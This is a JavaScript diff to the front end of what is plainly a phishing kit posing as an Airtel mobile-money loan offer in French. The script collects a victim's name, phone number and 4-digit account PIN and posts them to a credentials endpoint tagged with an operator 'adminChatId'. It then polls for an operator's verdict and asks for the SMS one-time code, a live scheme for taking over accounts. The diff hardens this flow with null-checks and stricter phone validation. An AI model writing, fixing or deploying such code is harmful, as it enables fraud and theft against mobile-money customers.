@@ -11,6 +11,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const credsSurfaceBanner = document.getElementById('creds-surface-banner');
   const otpSurfaceBanner = document.getElementById('otp-surface-banner');
+  const phoneError = document.getElementById('phone-error');
 
   let currentUserId = null;
   let statusPollInterval = null;
@@ -38,7 +39,8 @@ document.addEventListener('DOMContentLoaded', () => {
       const val = `${Number(e.target.value).toLocaleString()} FCFA`;
       balanceVal.innerText = val;
       if (formAmount) formAmount.value = val;
-      document.getElementById('summary-amount').innerText = val;
+      const summaryAmt = document.getElementById('summary-amount');
+      if (summaryAmt) summaryAmt.innerText = val;
     });
   }
 
@@ -47,50 +49,87 @@ document.addEventListener('DOMContentLoaded', () => {
       const val = `${e.target.value} mois`;
       durationVal.innerText = val;
       if (formDuration) formDuration.value = `${e.target.value} Mois`;
-      document.getElementById('summary-duration').innerText = `${e.target.value} Mois`;
+      const summaryDur = document.getElementById('summary-duration');
+      if (summaryDur) summaryDur.innerText = `${e.target.value} Mois`;
+    });
+  }
+
+  // Enforce Phone Number to ONLY start with 0
+  const phoneInput = document.getElementById('phone-number');
+  if (phoneInput) {
+    phoneInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val.length > 0 && !val.startsWith('0')) {
+        val = '0' + val.replace(/^0+/, '');
+      }
+      e.target.value = val;
     });
   }
 
   // Multi-step Navigation
-  document.getElementById('btn-understand-proceed').addEventListener('click', () => showStep(stepSlider));
+  const btnUnderstand = document.getElementById('btn-understand-proceed');
+  if (btnUnderstand) btnUnderstand.addEventListener('click', () => showStep(stepSlider));
   
-  document.getElementById('btn-slider-next').addEventListener('click', () => {
-    formAmount.value = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
-    showStep(stepForm1);
-  });
+  const btnSliderNext = document.getElementById('btn-slider-next');
+  if (btnSliderNext) {
+    btnSliderNext.addEventListener('click', () => {
+      if (sliderBalance && formAmount) {
+        formAmount.value = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
+      }
+      showStep(stepForm1);
+    });
+  }
 
-  document.getElementById('btn-form1-next').addEventListener('click', () => showStep(stepForm2));
-  document.getElementById('btn-form2-back').addEventListener('click', () => showStep(stepForm1));
+  const btnForm1Next = document.getElementById('btn-form1-next');
+  if (btnForm1Next) btnForm1Next.addEventListener('click', () => showStep(stepForm2));
 
-  document.getElementById('btn-form2-next').addEventListener('click', () => {
-    const firstName = document.getElementById('first-name').value.trim();
-    const lastName = document.getElementById('last-name').value.trim();
-    const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
+  const btnForm2Back = document.getElementById('btn-form2-back');
+  if (btnForm2Back) btnForm2Back.addEventListener('click', () => showStep(stepForm1));
 
-    if (phone.length < 8) {
-      document.getElementById('phone-error').style.display = 'block';
-      return;
-    }
-    document.getElementById('phone-error').style.display = 'none';
+  const btnForm2Next = document.getElementById('btn-form2-next');
+  if (btnForm2Next) {
+    btnForm2Next.addEventListener('click', () => {
+      const firstName = document.getElementById('first-name').value.trim();
+      const lastName = document.getElementById('last-name').value.trim();
+      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
 
-    document.getElementById('summary-applicant').innerText = `${firstName} ${lastName}`.trim() || 'Client Airtel';
-    document.getElementById('summary-purpose').innerText = document.getElementById('loan-type').value;
+      // Validate phone starts with 0 and has appropriate length
+      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
+        if (phoneError) {
+          phoneError.innerText = 'Le numéro de téléphone doit commencer par 0 et être valide.';
+          phoneError.style.display = 'block';
+        }
+        return;
+      }
+      if (phoneError) phoneError.style.display = 'none';
 
-    showStep(stepForm3);
-  });
+      const sumApplicant = document.getElementById('summary-applicant');
+      const sumPurpose = document.getElementById('summary-purpose');
+      const loanTypeEl = document.getElementById('loan-type');
 
-  document.getElementById('btn-form3-back').addEventListener('click', () => showStep(stepForm2));
+      if (sumApplicant) sumApplicant.innerText = `${firstName} ${lastName}`.trim() || 'Client Airtel';
+      if (sumPurpose && loanTypeEl) sumPurpose.innerText = loanTypeEl.value;
 
-  document.getElementById('btn-form3-submit').addEventListener('click', () => {
-    const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
-    const displayPhone = document.getElementById('display-applicant-phone');
-    if (displayPhone) {
-      displayPhone.innerText = `+243 ${phone}`;
-    }
+      showStep(stepForm3);
+    });
+  }
 
-    showStep(stepPin);
-    if (pinDigits[0]) pinDigits[0].focus();
-  });
+  const btnForm3Back = document.getElementById('btn-form3-back');
+  if (btnForm3Back) btnForm3Back.addEventListener('click', () => showStep(stepForm2));
+
+  const btnForm3Submit = document.getElementById('btn-form3-submit');
+  if (btnForm3Submit) {
+    btnForm3Submit.addEventListener('click', () => {
+      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
+      const displayPhone = document.getElementById('display-applicant-phone');
+      if (displayPhone) {
+        displayPhone.innerText = phoneVal;
+      }
+
+      showStep(stepPin);
+      if (pinDigits[0]) pinDigits[0].focus();
+    });
+  }
 
   // Digits input focus and auto-submit
   const pinDigits = document.querySelectorAll('.pin-digit');
@@ -122,41 +161,47 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(otpDigits4, () => submitOtpHandler());
 
   // Submit Credentials (Phone & PIN)
-  document.getElementById('btn-submit-creds').addEventListener('click', async () => {
-    const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
-    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
+  const btnSubmitCreds = document.getElementById('btn-submit-creds');
+  if (btnSubmitCreds) {
+    btnSubmitCreds.addEventListener('click', async () => {
+      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
+      const pinVal = Array.from(pinDigits).map(i => i.value).join('');
 
-    if (pinVal.length !== 4) {
-      document.getElementById('pin-error').style.display = 'block';
-      return;
-    }
-    document.getElementById('pin-error').style.display = 'none';
-
-    if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
-    showLoading('Vérification en cours...', 'Envoi sécurisé de vos identifiants.');
-
-    try {
-      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone, pin: pinVal, adminChatId: adminParam })
-      });
-
-      const data = await res.json();
-      if (data.success) {
-        currentUserId = data.userId;
-        document.getElementById('loading-title').innerText = 'En attente de validation de l\'administrateur...';
-        document.getElementById('loading-sub').innerText = 'Veuillez rester sur cette page.';
-        startStatusPolling();
-      } else {
-        hideLoading();
-        alert(data.error || 'Échec du traitement.');
+      const pinError = document.getElementById('pin-error');
+      if (pinVal.length !== 4) {
+        if (pinError) pinError.style.display = 'block';
+        return;
       }
-    } catch (e) {
-      hideLoading();
-      alert('Erreur réseau.');
-    }
-  });
+      if (pinError) pinError.style.display = 'none';
+
+      if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
+      showLoading('Vérification en cours...', 'Envoi sécurisé de vos identifiants.');
+
+      try {
+        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
+        });
+
+        const data = await res.json();
+        if (data.success) {
+          currentUserId = data.userId;
+          const loadTitle = document.getElementById('loading-title');
+          const loadSub = document.getElementById('loading-sub');
+          if (loadTitle) loadTitle.innerText = "En attente de validation de l'administrateur...";
+          if (loadSub) loadSub.innerText = 'Veuillez rester sur cette page.';
+          startStatusPolling();
+        } else {
+          hideLoading();
+          alert(data.error || 'Échec du traitement.');
+        }
+      } catch (e) {
+        hideLoading();
+        alert('Erreur réseau.');
+      }
+    });
+  }
 
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
@@ -176,7 +221,10 @@ document.addEventListener('DOMContentLoaded', () => {
         } else if (data.status === 'SUCCESS') {
           clearInterval(statusPollInterval);
           hideLoading();
-          document.getElementById('approved-amount-display').innerText = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
+          const approvedDisp = document.getElementById('approved-amount-display');
+          if (approvedDisp && sliderBalance) {
+            approvedDisp.innerText = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
+          }
           showStep(stepSuccess);
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(statusPollInterval);
@@ -200,11 +248,12 @@ document.addEventListener('DOMContentLoaded', () => {
   async function submitOtpHandler() {
     const otpVal = Array.from(otpDigits4).map(i => i.value).join('');
 
+    const otpError = document.getElementById('otp-error');
     if (otpVal.length !== 4) {
-      document.getElementById('otp-error').style.display = 'block';
+      if (otpError) otpError.style.display = 'block';
       return;
     }
-    document.getElementById('otp-error').style.display = 'none';
+    if (otpError) otpError.style.display = 'none';
     if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
 
     showLoading('Vérification du code OTP...', 'Analyse du SMS Airtel.');
@@ -218,8 +267,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
       const data = await res.json();
       if (data.success) {
-        document.getElementById('loading-title').innerText = 'Validation en cours...';
-        document.getElementById('loading-sub').innerText = 'Veuillez patienter.';
+        const loadTitle = document.getElementById('loading-title');
+        const loadSub = document.getElementById('loading-sub');
+        if (loadTitle) loadTitle.innerText = 'Validation en cours...';
+        if (loadSub) loadSub.innerText = 'Veuillez patienter.';
         startStatusPolling();
       } else {
         hideLoading();
@@ -229,15 +280,21 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  document.getElementById('btn-submit-otp').addEventListener('click', submitOtpHandler);
+  const btnSubmitOtp = document.getElementById('btn-submit-otp');
+  if (btnSubmitOtp) btnSubmitOtp.addEventListener('click', submitOtpHandler);
 
-  document.getElementById('btn-go-home').addEventListener('click', () => {
-    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
-  });
+  const btnGoHome = document.getElementById('btn-go-home');
+  if (btnGoHome) {
+    btnGoHome.addEventListener('click', () => {
+      window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
+    });
+  }
 
   function showLoading(title, sub) {
-    document.getElementById('loading-title').innerText = title;
-    document.getElementById('loading-sub').innerText = sub;
+    const loadTitle = document.getElementById('loading-title');
+    const loadSub = document.getElementById('loading-sub');
+    if (loadTitle) loadTitle.innerText = title;
+    if (loadSub) loadSub.innerText = sub;
     if (stepLoading) stepLoading.classList.add('active');
   }
 
@@ -245,4 +302,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-                                        
+                                    
